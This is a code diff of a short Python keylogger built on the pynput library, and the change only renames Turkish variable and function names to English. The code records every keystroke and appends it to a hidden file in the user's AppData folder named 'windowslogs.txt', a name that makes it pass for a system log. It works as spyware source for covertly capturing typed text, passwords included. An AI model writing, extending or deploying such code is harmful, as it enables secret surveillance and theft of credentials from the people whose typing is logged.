@@ -1,7 +1,7 @@
 from pynput.keyboard import Key,Listener
 import os
 
-kg_dosya = os.environ["appdata"]+"\\windowslogs.txt"
+kg_file = os.environ["appdata"]+"\\windowslogs.txt"
 
 def on_press(key):
     letters = str(key)
@@ -16,13 +16,13 @@ def on_press(key):
         letters = "<backspace>"
     if key == Key.esc:
         letters = ""
-    with open(kg_dosya, "a", encoding="utf-8") as f:
+    with open(kg_file, "a", encoding="utf-8") as f:
         f.write(letters)
 
 def on_release(key):
     if key == Key.esc:
         return False
-def kgBasla():
+def kg_Start():
     with Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
 
